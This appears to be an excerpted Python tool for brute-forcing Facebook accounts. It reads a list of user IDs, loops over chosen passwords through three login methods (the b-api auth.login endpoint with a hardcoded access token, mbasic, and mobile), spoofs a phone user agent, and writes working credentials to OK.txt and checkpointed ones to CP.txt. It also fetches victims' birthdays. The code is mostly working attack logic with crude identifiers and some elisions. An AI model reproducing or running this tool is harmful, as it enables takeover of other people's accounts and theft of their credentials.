...
def hasil(ok,cp):
	if len(ok) != 0 or len(cp) != 0:
		...
		#QURBAN_AKING('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
	else:
...
class __crack__:
	...
	def plerr(self):
		try:
			...
			print (' [*]=============================================')
			self.id = QURBAN(self.apk).read().splitlines()
			QURBAN_AKING(' [*] Total ID : %s'%(len(self.id)))
		...
		if _jokowi_kontol_ in ('M', 'm'):
				...
				if pwek == '':
					...
					def _sempak_(bse=None):
						...
						if boy == '':
							...
							QURBAN_AKING('[•] Result CP saved to CP.txt')
							QURBAN_AKING('\n\tCrack Processing...\n')
							QURBAN_AKING('\n\tCrack Processing...\n\n');logo()
							...
							exit()
					QURBAN_AKING('\n01.) Metode b-api ')
					QURBAN_AKING('02.) Metode mbasic ')
					QURBAN_AKING('03.) Metode Mobile ')
					_sempak_(pwek.split(','))
					break
			...
			IMTIAZ_AKING('\n\t------[ Method Crack ]-----')
			print (' [*]=============================================')
			QURBAN_AKING(' [1] AKING Method 1 ')
			QURBAN_AKING(' [2] AKING Method 2  [ Pro ]')
			QURBAN_AKING(' [3] AKING Method 3   ')
			print (' [*]=============================================')
			self.__pler__()
		else:
			exit()
	...
	def __api__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			try:
				...
				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
			p = Prof_QURBAN("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+user+"&locale=en_US&password="+pw+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6").json()
			if "access_token" in p:
				QURBAN_AKING('\r\033[1;92m[Successful-AKING] %s | %s%s      '%(user,pw,tahun(user)))
				...
				try:
					token = QURBAN('login.txt').read()
					cp_ttl = Prof_QURBAN('https://graph.facebook.com/%s?access_token=%s'%(user,token)).json()['birthday']
					month, day, year = cp_ttl.split('/')
					month = bulan_ttl[month]
					QURBAN_AKING('\r\033[1;91m[Checkpoint-AKING] %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
					...
					pass
				QURBAN_AKING('\r\033[1;91m[Checkpoint-AKING] %s | %s%s      '%(user,pw,tahun(user)))
				wrt = '%s - %s%s' % (user,pw,tahun(user))
				cp.append(wrt)
				open('CP.txt','a').write('%s\n' % wrt)
				break
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				QURBAN_AKING('\r\033[1;32m[Successful-AKING] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
	...
	def __mfb__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			try:
				ua_xiaomi = QURBAN('agent.txt', 'r').read()
			except (KeyError, IOError):
				ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
			ses = requests.Session()
			...
			if 'c_user' in ses.cookies.get_dict():
				QURBAN_AKING('\r\033[1;92m[Successful-AKING] %s | %s      '%(user,pw))
				wrt = '%s - %s - %s' % (user,pw)
				ok.append(wrt)
				open('OK.txt','a').write('%s\n' % wrt)
				break
...
| $$/$$ $$| $$  | $$| $$  \ $$| $$  \ $$| $$  | $$| $$\  $$$
|  $$$$$$/|  $$$$$$/| $$  | $$| $$$$$$$/| $$  | $$| $$ \  $$
 \____ $$$ \______/ |__/  |__/|_______/ |__/  |__/|__/  \__/
      \__/                                                  
